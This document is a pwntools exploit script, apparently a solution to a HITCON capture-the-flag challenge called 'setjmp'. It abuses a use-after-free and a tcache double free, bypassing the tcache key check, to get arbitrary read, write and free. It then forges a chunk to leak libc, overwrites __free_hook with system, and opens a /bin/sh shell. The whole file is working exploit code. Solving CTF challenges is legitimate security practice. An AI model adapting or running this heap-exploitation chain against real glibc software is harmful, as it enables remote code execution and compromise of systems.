from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("run")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("setjmp.chal.hitconctf.com", 1337)
	# p = remote("127.0.0.1", 1337)
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p)
		pause()

def restart():
	p.sendlineafter(b"> ", b"1")

def new_user(username, password):
	p.sendlineafter(b"> ", b"2")
	p.sendafter(b"> ", username)
	p.sendafter(b"> ", password)

def del_user(username):
	p.sendlineafter(b"> ", b"3")
	p.sendafter(b"> ", username)

def change_pass(username, password):
	p.sendlineafter(b"> ", b"4")
	p.sendafter(b"> ", username)
	p.sendafter(b"> ", password)

def view_users():
	p.sendlineafter(b"> ", b"5")

# heap leak by viewing a user with an 8-character password
new_user(b"A\n", b"a" * 8)
view_users()
p.recvuntil(b"A: aaaaaaaa")
heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
heap_base = heap_leak - 0x370
log.success("heap base = " + hex(heap_base))

def arb_write(where, what1, what2):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))	# the heap leak each time points to the current "root" user
	del_user(b"root\n")
	del_user(b"A\n")	# delete the head of the linked list => UAF
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"	# the username of the UAF'd user is now its fd pointer
	change_pass(uaf_user, b"junk")	# write junk into tcache 'key' to avoid tcache double free protection ("free(): double free detected in tcache 2")
	del_user(uaf_user)	# double-free
	new_user(p64(where), b"CCCC\n")	# get 'where' into the tcache chunk's fd
	new_user(b"DDDD\n", b"EEEE\n")	# get 'where' into the tcache head
	new_user(p64(what1), p64(what2))	# allocate a chunk at 'where' and write arbitrary values in it

# similar to arb_write. We just view the chunk that is allocated at 'where'
def arb_read(where, lsb):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
	del_user(b"root\n")
	del_user(b"A\n")
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"
	change_pass(uaf_user, b"junk")
	del_user(uaf_user)
	new_user(p64(where), b"CCCC\n")
	new_user(b"DDDD\n", b"EEEE\n")
	new_user(lsb, lsb)	# we have to enter at least one byte for the username/password
	view_users()
	p.recvuntil(lsb)
	leak = p.recvuntil(b": ", drop=True).ljust(7, b"\0")
	leak = b"\0" + leak
	return u64(leak)

def arb_free(where):
	restart()
	new_user(b"A\n", b"a" * 8)
	view_users()
	p.recvuntil(b"A: aaaaaaaa")
	heap_leak = u64(p.recvuntil(b"root", drop=True)[:-1].ljust(8, b"\0"))
	del_user(b"root\n")
	del_user(b"A\n")
	uaf_user = p64(heap_leak).rstrip(b"\0") + b"\n"
	change_pass(uaf_user, b"junk")
	del_user(uaf_user)
	new_user(p64(where), b"CCCC\n")
	new_user(b"DDDD\n", b"EEEE\n")
	new_user(b"SSSS\n", b"SSSS\n")	# this chunk is allocated at 'where'
	del_user(b"SSSS\n")	# free the chunk allocated at 'where' => arbitrary free

fake_chunk = heap_base + 0x5008	# the address we want to put our fake large chunk at
arb_write(fake_chunk, 0x501, 0)	# chunk size that doesn't fit in tcache
arb_write(fake_chunk + 0x500, 0x21, 0)	# its next chunk
arb_write(fake_chunk + 0x500 + 0x20, 0x21, 0)	# its next->next chunk
arb_free(fake_chunk + 8)	# free the fake chunk

libc_leak = arb_read(heap_base + 0x5218, b"\xe0")	# read the libc leaks. be careful not to corrupt any of the two libc pointers in the process though (need to use their correct LSB)
libc.address = libc_leak - 0x1ecb00
log.success("libc base = " + hex(libc.address))

arb_write(libc.sym["__free_hook"], libc.sym["system"], 0)	# __free_hook => system()
restart()
new_user(b"/bin/sh\0", b"a\n")
del_user(b"/bin/sh\0")	# system("/bin/sh")

p.interactive()
